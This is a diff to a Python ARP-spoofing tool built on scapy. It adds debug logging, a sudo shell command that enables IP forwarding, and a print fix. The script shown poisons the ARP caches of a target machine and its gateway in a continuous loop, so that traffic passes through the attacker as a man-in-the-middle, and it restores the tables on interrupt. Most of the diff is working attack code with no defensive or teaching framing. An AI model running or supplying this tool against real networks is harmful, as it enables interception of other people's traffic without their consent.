@@ -2,6 +2,10 @@ import scapy.all as scapy
 import os
 import sys
 import time
+import logging
+
+logging.basicConfig(filename='spoofing.log', level=logging.DEBUG,
+                    format='%(asctime)s:%(levelname)s:%(message)s')
 
 
 def become_root():
@@ -15,18 +19,6 @@ def become_root():
     print("---------------------------------------------------------")
 
 
-# def _enable_linux_iproute():
-#     """
-#     Enables IP route ( IP Forward ) in linux-based distro
-#     """
-#     file_path = "/proc/sys/net/ipv4/ip_forward"
-#     with open(file_path) as f:
-#         if f.read() == 1:
-#             # already enabled
-#             return
-#     with open(file_path, "w") as f:
-#         print(1, file=f)
-
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -38,6 +30,7 @@ def get_mac(ip):
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
+    logging.debug('MAC address of Target machine = {}'.format(target_mac))
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
@@ -55,20 +48,24 @@ sent_packets = 0
 
 
 def run_spoof():
+    os.system("sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'")
     global sent_packets
     become_root()
     target_ip = input("Enter the target ip you want to spoof: ")
     gateway_ip = input("\nEnter the IP address of the Gateway: ")
+    logging.debug('Target IP Address = {}'.format(target_ip))
+    logging.debug('Gateway IP Address = {}'.format(gateway_ip))
     try:
         while True:
             spoof(target_ip, gateway_ip)  # Tell the target that we are the router
             spoof(gateway_ip, target_ip)  # Tell the router that we are the target
             sent_packets = sent_packets + 2
-            print("\r[+] Packets Sent {}" + str(sent_packets))
+            print("\r[+] Packets Sent " + str(sent_packets))
             sys.stdout.flush()
             time.sleep(2)
     except KeyboardInterrupt:
         print("\n[+] Keyboard Interrupt CTRL + C Detected...Restoring ARP tables...")
         restore(target_ip, gateway_ip)
         restore(gateway_ip, target_ip)
+
 
